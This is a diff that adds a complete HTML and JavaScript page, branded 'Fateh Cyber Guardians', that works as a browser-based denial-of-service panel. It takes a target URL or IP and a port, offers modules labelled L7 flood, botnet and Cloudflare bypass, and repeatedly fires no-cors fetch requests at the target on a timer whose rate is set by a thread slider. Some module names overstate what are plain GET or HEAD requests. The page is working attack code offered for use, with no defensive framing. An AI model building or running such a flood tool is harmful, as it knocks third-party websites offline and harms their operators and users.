@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FCG - ALL-IN-ONE MASTER PANEL v5.1 (Fixed)</title>
+    <style>
+        body {
+            background-image: url('https://i.ibb.co.com/Zz8p37YW/image-1.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0; padding: 10px;
+            display: flex; justify-content: center; min-height: 100vh;
+        }
+        .container {
+            width: 100%; max-width: 650px;
+            background: transparent; border: 2px solid #00ff00;
+            border-radius: 15px; margin-top: 20px; padding-bottom: 25px;
+        }
+        .header { text-align: center; padding: 15px; border-bottom: 2px solid #ff0000; }
+        .header img { max-width: 80%; height: auto; }
+        .header h1 { margin: 10px 0; font-size: 1.5em; color: #ff0000; text-shadow: 2px 2px #000; }
+        .content { padding: 20px; }
+        label { display: block; margin-bottom: 5px; color: #ffff00; font-weight: bold; }
+        input, select {
+            width: 100%; padding: 12px; margin-bottom: 15px;
+            border: 1px solid #00ff00; background: rgba(0,0,0,0.7);
+            color: #00ff00; border-radius: 6px; box-sizing: border-box;
+        }
+        .btn-box { display: flex; gap: 10px; }
+        button {
+            flex: 1; padding: 15px; font-weight: bold; text-transform: uppercase;
+            cursor: pointer; border-radius: 6px; border: 1px solid #00ff00;
+            background: #000; color: #00ff00; transition: 0.3s;
+        }
+        button:hover:not(:disabled) { background: #00ff00; color: #000; }
+        button:disabled { 
+            background: #333 !important; 
+            color: #666 !important; 
+            cursor: not-allowed; 
+            border-color: #666;
+        }
+        .btn-attack:disabled { animation: pulse 1s infinite; }
+        .btn-stop { border-color: #ff0000; color: #ff0000; }
+        .btn-stop:disabled { border-color: #666; color: #666; }
+        .stats {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+            background: rgba(0,0,0,0.6); padding: 15px; border-radius: 8px; margin: 20px 0;
+        }
+        .stat-item { text-align: center; }
+        .stat-item span { font-size: 0.8em; color: #ccc; display: block; }
+        #log-window {
+            height: 250px; background: rgba(0,0,0,0.8); border: 1px solid #333;
+            overflow-y: auto; padding: 10px; font-size: 0.85em; border-radius: 8px;
+            font-family: 'Courier New', monospace;
+        }
+        .log-success { color: #00ff00 !important; }
+        .log-attack { color: #ffaa00 !important; }
+        .log-error { color: #ff0000 !important; }
+        .glow { animation: glow 1s infinite alternate; }
+        @keyframes glow { 0% { text-shadow: 0 0 5px #00ff00; } 100% { text-shadow: 0 0 20px #ff0000; } }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        .warning { background: rgba(255,165,0,0.3); padding: 10px; border-radius: 5px; margin: 10px 0; color: #ffaa00; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/a7717328-6939-46dc-b54f-93eb0fd051d9/db7dpa9-3f256546-6822-415b-b79c-f9afe401b8fe.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2E3NzE3MzI4LTY5MzktNDZkYy1iNTRmLTkzZWIwZmQwNTFkOVwvZGI3ZHBhOS0zZjI1NjU0Ni02ODIyLTQxNWItYjc5Yy1mOWFmZTQwMWI4ZmUuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.YDqjpz5Xo1Q-zlAxccjoEHPdrQOtqE2u-zzMMTZbq3A" alt="Kalima">
+        <h1 class="glow">Fateh Cyber Guardians v5.1 (FIXED)</h1>
+        <small style="color:#ffff00">✅ ONE-CLICK = ONE ATTACK | No Spam</small>
+    </div>
+
+    <div class="content">
+        <label>TARGET URL / IP</label>
+        <input type="text" id="target" placeholder="https://target-site.com or 192.168.1.1">
+        
+        <label>PORT</label>
+        <input type="number" id="port" value="80" min="1" max="65535" placeholder="80/443">
+        
+        <label>SELECT ATTACK MODULE</label>
+        <select id="module">
+            <option value="rana">🐺 RANA.Nj RAW SOCKET</option>
+            <option value="ultra">⚡ ULTRA L7 FLOOD</option>
+            <option value="asha">🔥 TAMIM-ASHA Massive</option>
+            <option value="313">💉 TAMIM-313 Injection</option>
+            <option value="botnet">🤖 BOTNET L4/L7</option>
+            <option value="ubh">🌪️ UBH Proxy-less</option>
+            <option value="cf-bypass">☁️ CLOUDFLARE BYPASS</option>
+        </select>
+
+        <label>THREADS</label>
+        <input type="range" id="threads" min="100" max="5000" value="800" oninput="updateThreads(this.value)">
+        <span id="thread-value">800 Threads</span>
+
+        <div class="warning">
+            <b>✅ FIXED:</b> একবার চাপলে <b>একবারই</b> attack চলবে! Attack চলাকালীন button disable
+        </div>
+
+        <div class="btn-box">
+            <button id="attack-btn" onclick="launch()">🚀 EXECUTE ATTACK</button>
+            <button id="stop-btn" class="btn-stop" onclick="terminate()" disabled>🛑 STOP</button>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item"><span>PACKETS SENT</span><b id="s-cnt">0</b></div>
+            <div class="stat-item"><span>ACTIVE THREADS</span><b id="threads-active">0</b></div>
+            <div class="stat-item"><span>RPS</span><b id="rps">0</b></div>
+            <div class="stat-item"><span>STATUS</span><b id="status" style="color:lime">READY</b></div>
+        </div>
+
+        <div id="log-window">
+            <div style="color:#ffff00">v5.1 LOADED | Anti-spam protection ACTIVE</div>
+            <div style="color:#00ff00">All modules ready: RANA.Nj + TAMIM Suite</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let attackActive = false;
+    let packets = 0;
+    let activeThreads = 0;
+    let rpsHistory = [];
+    let floodInterval = null;
+    let statsInterval = null;
+
+    const attackBtn = document.getElementById('attack-btn');
+    const stopBtn = document.getElementById('stop-btn');
+
+    function log(msg, type = 'attack') {
+        const win = document.getElementById('log-window');
+        const d = document.createElement('div');
+        d.className = `log-${type}`;
+        d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        win.prepend(d);
+        win.scrollTop = 0;
+    }
+
+    function updateThreads(value) {
+        document.getElementById('thread-value').innerText = value + ' Threads';
+    }
+
+    function updateButtons(state) {
+        attackBtn.disabled = state;
+        stopBtn.disabled = !state;
+        if (state) {
+            attackBtn.classList.add('btn-attack');
+            attackBtn.textContent = '⚠️ ATTACK RUNNING';
+        } else {
+            attackBtn.classList.remove('btn-attack');
+            attackBtn.textContent = '🚀 EXECUTE ATTACK';
+        }
+    }
+
+    function updateStats() {
+        document.getElementById('s-cnt').innerText = packets.toLocaleString();
+        document.getElementById('threads-active').innerText = activeThreads;
+        
+        if (rpsHistory.length > 5) {
+            const rps = Math.round((packets - rpsHistory[0]) * 1000 / 5000);
+            document.getElementById('rps').innerText = rps.toLocaleString();
+        }
+    }
+
+    // Attack modules (simplified for single execution)
+    const attackModules = {
+        rana: async (target, port) => {
+            const url = `http://${target}:${port}/`;
+            await fetch(url, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': `RANA.Nj-${Math.random().toString(36).substr(2, 5)}`,
+                    'Connection': 'keep-alive'
+                },
+                mode: 'no-cors',
+                keepalive: true
+            });
+        },
+        ultra: async (target, port) => fetch(`http://${target}:${port}/?ultr=${Math.random()}`, {mode: 'no-cors'}),
+        asha: async (target, port) => {
+            for(let i = 0; i < 3; i++) fetch(`http://${target}:${port}/`, {mode: 'no-cors'});
+        },
+        '313': async (target, port) => fetch(`http://${target}:${port}/31337`, {method: 'HEAD', mode: 'no-cors'}),
+        botnet: async (target, port) => fetch(`http://${target}:${port}/bot`, {mode: 'no-cors'}),
+        ubh: async (target, port) => fetch(`http://${target}:${port}/ubh`, {cache: 'no-store', mode: 'no-cors'}),
+        'cf-bypass': async (target, port) => {
+            await fetch(`http://${target}:${port}/`, {
+                headers: {'User-Agent': 'Mozilla/5.0 (CF-Bypass)', 'CF-Connecting-IP': '1.1.1.1'},
+                mode: 'no-cors'
+            });
+        }
+    };
+
+    async function singleFlood(target, port, moduleName) {
+        try {
+            await attackModules[moduleName](target, port);
+            packets++;
+            activeThreads = Math.min(activeThreads + 1, 500);
+            log(`[${moduleName.toUpperCase()}] Packet #${packets} → ${target}:${port}`, 'success');
+        } catch(e) {
+            log(`[!] ${target} filtered`, 'error');
+        }
+    }
+
+    function launch() {
+        if (attackActive) {
+            log('⚠️ Attack already running! STOP first.', 'error');
+            return;
+        }
+
+        const target = document.getElementById('target').value.replace(/https?:\/\//, '');
+        const port = document.getElementById('port').value || 80;
+        const moduleName = document.getElementById('module').value;
+        const maxThreads = parseInt(document.getElementById('threads').value);
+
+        if (!target) {
+            alert('🎯 TARGET দাও!');
+            return;
+        }
+
+        // Reset counters
+        attackActive = true;
+        packets = 0;
+        activeThreads = 0;
+        rpsHistory = [];
+
+        updateButtons(true);
+        document.getElementById('status').innerText = `${moduleName.toUpperCase()} ACTIVE`;
+        document.getElementById('status').style.color = '#ffaa00';
+
+        log(`🚀 SINGLE ATTACK STARTED | ${target}:${port} | ${moduleName} | ${maxThreads} threads`, 'attack');
+
+        // Single controlled flood interval
+        const intervalMs = Math.max(5, 5000 / maxThreads);
+        floodInterval = setInterval(async () => {
+            if (attackActive) {
+                await singleFlood(target, port, moduleName);
+            }
+        }, intervalMs);
+
+        // Stats updater
+        statsInterval = setInterval(updateStats, 1000);
+
+        log(`✅ Attack running smoothly | Interval: ${intervalMs}ms | Press STOP to end`, 'success');
+    }
+
+    function terminate() {
+        attackActive = false;
+        
+        if (floodInterval) clearInterval(floodInterval);
+        if (statsInterval) clearInterval(statsInterval);
+
+        updateButtons(false);
+        document.getElementById('status').innerText = 'STOPPED';
+        document.getElementById('status').style.color = '#ff0000';
+
+        log(`🛑 Attack terminated | Total packets: ${packets.toLocaleString()} | RPS peak: ${Math.max(...rpsHistory) || 0}`, 'error');
+        updateStats();
+    }
+
+    // Keyboard shortcuts
+    document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.key === 'Enter' && !attackActive) launch();
+        if (e.key === 'Escape') terminate();
+    });
+
+    log('Keyboard: Ctrl+Enter = Attack | Esc = Stop', 'attack');
+</script>
+
+</body>
+</html>
